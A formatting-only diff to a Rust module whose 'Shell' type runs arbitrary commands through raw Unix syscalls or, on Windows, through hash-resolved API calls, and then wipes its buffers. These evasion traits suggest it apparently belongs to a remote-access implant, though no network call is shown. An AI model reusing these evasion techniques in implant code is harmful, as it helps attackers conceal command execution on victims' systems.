@@ -1,9 +1,11 @@
-use alloc::vec::Vec;
 use crate::utils::sensitive::SensitiveData;
+use alloc::vec::Vec;
 use zeroize::Zeroize;
 
 #[cfg(not(target_os = "windows"))]
-use crate::utils::syscalls::{sys_fork, sys_execve, sys_pipe, sys_dup2, sys_read, sys_close, sys_exit};
+use crate::utils::syscalls::{
+    sys_close, sys_dup2, sys_execve, sys_exit, sys_fork, sys_pipe, sys_read,
+};
 
 #[cfg(target_os = "windows")]
 use crate::utils::api_resolver::{hash_str, resolve_function};
@@ -74,15 +76,20 @@ impl Shell {
                 sys_close(pipefd[0] as usize);
                 sys_dup2(pipefd[1], 1);
                 sys_dup2(pipefd[1], 2);
-                
+
                 let sh = b"/bin/sh\0";
                 let arg1 = b"-c\0";
                 let mut cmd_c = Vec::from(cmd.as_bytes());
                 cmd_c.push(0);
-                
-                let argv = [sh.as_ptr(), arg1.as_ptr(), cmd_c.as_ptr(), core::ptr::null()];
+
+                let argv = [
+                    sh.as_ptr(),
+                    arg1.as_ptr(),
+                    cmd_c.as_ptr(),
+                    core::ptr::null(),
+                ];
                 let envp = [core::ptr::null()];
-                
+
                 sys_execve(sh.as_ptr(), argv.as_ptr(), envp.as_ptr());
                 cmd_c.zeroize(); // Only reached if execve fails
                 sys_exit(1);
@@ -93,11 +100,13 @@ impl Shell {
                 let mut buf = [0u8; 4096];
                 loop {
                     let n = sys_read(pipefd[0] as usize, buf.as_mut_ptr(), 4096);
-                    if n as isize <= 0 { break; }
+                    if n as isize <= 0 {
+                        break;
+                    }
                     output.extend_from_slice(&buf[..n]);
                 }
                 sys_close(pipefd[0] as usize);
-                
+
                 let sensitive = SensitiveData::new(&output);
                 output.zeroize();
                 buf.zeroize();
@@ -118,9 +127,25 @@ impl Shell {
                 return SensitiveData::new(b"Resolution failed");
             }
 
-            type FnCreatePipe = unsafe extern "system" fn(*mut HANDLE, *mut HANDLE, *mut SECURITY_ATTRIBUTES, u32) -> i32;
+            type FnCreatePipe = unsafe extern "system" fn(
+                *mut HANDLE,
+                *mut HANDLE,
+                *mut SECURITY_ATTRIBUTES,
+                u32,
+            ) -> i32;
             type FnSetHandleInfo = unsafe extern "system" fn(HANDLE, u32, u32) -> i32;
-            type FnCreateProcessA = unsafe extern "system" fn(LPCSTR, *mut u8, PVOID, PVOID, i32, u32, PVOID, LPCSTR, *mut STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32;
+            type FnCreateProcessA = unsafe extern "system" fn(
+                LPCSTR,
+                *mut u8,
+                PVOID,
+                PVOID,
+                i32,
+                u32,
+                PVOID,
+                LPCSTR,
+                *mut STARTUPINFOA,
+                *mut PROCESS_INFORMATION,
+            ) -> i32;
             type FnReadFile = unsafe extern "system" fn(HANDLE, PVOID, u32, *mut u32, PVOID) -> i32;
             type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
 
@@ -133,7 +158,13 @@ impl Shell {
             let mut h_read: HANDLE = core::ptr::null_mut();
             let mut h_write: HANDLE = core::ptr::null_mut();
 
-            if core::mem::transmute::<_, FnCreatePipe>(create_pipe)(&mut h_read, &mut h_write, &mut sa, 0) == 0 {
+            if core::mem::transmute::<_, FnCreatePipe>(create_pipe)(
+                &mut h_read,
+                &mut h_write,
+                &mut sa,
+                0,
+            ) == 0
+            {
                 return SensitiveData::new(b"Pipe creation failed");
             }
 
@@ -149,7 +180,7 @@ impl Shell {
             si.dwFlags = 0x100;
 
             let mut pi: PROCESS_INFORMATION = core::mem::zeroed();
-            
+
             let mut cmd_mut = Vec::from(b"cmd.exe /c ");
             cmd_mut.extend_from_slice(cmd.as_bytes());
             cmd_mut.push(0);
@@ -165,9 +196,9 @@ impl Shell {
                 core::ptr::null_mut(),
                 core::ptr::null_mut(),
                 &mut si,
-                &mut pi
+                &mut pi,
             );
-            
+
             cmd_mut.zeroize();
 
             if success == 0 {
@@ -183,12 +214,20 @@ impl Shell {
             let mut buf = [0u8; 4096];
             let mut bytes_read = 0;
             loop {
-                if core::mem::transmute::<_, FnReadFile>(read_file)(h_read, buf.as_mut_ptr() as PVOID, 4096, &mut bytes_read, core::ptr::null_mut()) == 0 || bytes_read == 0 {
+                if core::mem::transmute::<_, FnReadFile>(read_file)(
+                    h_read,
+                    buf.as_mut_ptr() as PVOID,
+                    4096,
+                    &mut bytes_read,
+                    core::ptr::null_mut(),
+                ) == 0
+                    || bytes_read == 0
+                {
                     break;
                 }
                 output.extend_from_slice(&buf[..bytes_read as usize]);
             }
-            
+
             buf.zeroize();
 
             core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_read);
